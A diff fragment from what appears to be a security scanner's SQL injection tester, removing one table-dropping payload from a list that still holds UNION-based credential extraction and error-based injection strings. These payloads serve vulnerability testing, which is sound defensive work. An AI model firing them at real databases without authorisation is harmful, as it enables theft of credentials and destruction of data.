@@ -101,7 +101,6 @@ class InjectionTester(VulnerabilityTester):
             # More complex injections
             "' UNION SELECT 1,2,3 --",
             "' OR 1=1 UNION SELECT 1,username,password FROM users --",
-            "' OR '1'='1'; DROP TABLE users --",
             # Error-based payloads
             "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
             "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --",
